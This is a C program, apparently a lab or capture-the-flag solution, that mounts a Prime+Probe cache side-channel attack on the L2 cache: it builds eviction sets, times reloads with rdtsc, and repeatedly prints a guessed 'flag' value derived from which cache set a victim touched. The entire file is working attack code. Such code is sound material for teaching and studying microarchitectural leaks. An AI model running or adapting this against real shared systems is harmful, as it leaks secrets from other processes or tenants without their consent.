#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>
#include <sys/mman.h>
#include "util.h"

#define NUM_L2_CACHE_SETS 1024
#define WAYS 16
#define LINE_SIZE 64
#define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)

#define REPEATS 1000

volatile uint8_t *buf;
volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];

static inline uint64_t rdtsc() {
    unsigned hi, lo;
    asm volatile("mfence");
    asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
    asm volatile("mfence");
    return ((uint64_t)hi << 32) | lo;
}

static inline void wait_cycles(uint64_t cycles) {
    uint64_t start = rdtsc();
    while (rdtsc() - start < cycles);
}

void shuffle(int *arr) {
    for(int i = NUM_L2_CACHE_SETS - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int tmp = arr[i];
        arr[i] = arr[j];
        arr[j] = tmp;
    }
}

int main() {
    /* works 2/3 of time. Randomize access, reverse probe, no usleep
    */
    printf("Attacker ready. Prime+Probe starting...\n");

    buf = mmap(NULL,
               2*1024*1024,
               PROT_READ | PROT_WRITE,
               MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
               -1,
               0);

    if(buf == (void*)-1){
        perror("mmap failed");
        exit(1);
    }

    *((char*)buf) = 1;

    for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
        for(int w = 0; w < WAYS; w++) {
            eviction_sets[set][w] = buf + set*LINE_SIZE + w*STRIDE;
        }
    }

    volatile uint8_t tmp = 0;

    while(1) {

        uint64_t scores[NUM_L2_CACHE_SETS] = {0};

        

        for(int r = 0; r < REPEATS; r++) {
            int perm[NUM_L2_CACHE_SETS];
            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
                perm[i] = i;
            }
            shuffle(perm);
            
            /* PRIME */
            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {

                int set = perm[i];

                for(int w = 0; w < WAYS; w++) {
                    tmp ^= *eviction_sets[set][w];
                }
            }

            wait_cycles(2000);

            /* PROBE */
            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {

                int set = perm[i];

                for(int w = WAYS-1; w >= 0; w--) {

                    uint64_t start = rdtsc();
                    tmp ^= *eviction_sets[set][w];
                    uint64_t end = rdtsc();

                    scores[set] += (end - start);
                }
            }
        }

        /* Combine alias groups */
        int best_group = 0;
        uint64_t best_score = 0;

        for(int base = 0; base < 256; base++) {

            uint64_t group_score =
                scores[base] +
                scores[base + 256] +
                scores[base + 512] +
                scores[base + 768];

            if(group_score > best_score) {
                best_score = group_score;
                best_group = base;
            }
        }

        /* find best set within group */
        int best_set = best_group;
        uint64_t best_latency = 0;

        for(int i = 0; i < 4; i++) {

            int s = best_group + i*256;
            uint64_t avg = scores[s] / REPEATS;

            if(avg > best_latency) {
                best_latency = avg;
                best_set = s;
            }
        }

        printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);

        wait_cycles(2000);
    }

    return 0;
}